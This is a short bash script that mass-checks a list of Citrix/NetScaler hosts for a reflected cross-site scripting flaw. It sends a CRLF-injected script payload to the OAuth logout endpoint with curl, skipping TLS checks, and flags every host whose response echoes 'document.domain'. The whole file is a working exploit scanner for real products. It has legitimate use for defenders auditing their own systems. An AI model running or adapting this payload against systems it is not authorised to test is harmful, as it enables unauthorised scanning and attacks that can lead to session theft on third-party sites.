#!/bin/bash
payload="/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
for i in $(cat citrix_urls.txt);
    do echo "[+] Checking reflected xss in citrix/netscalar at $i";
    echo ;
    k=$(curl "https://$i$payload" -s -k);
    t=$(echo $k | grep "document.domain");
    if [ -z "$t" ];
    then
        echo "Not Vulnerable";
    else
        echo "$i is Vulnerable to Reflected XSS!!";
    fi;
    echo "--------------------------------";
    echo ;
done
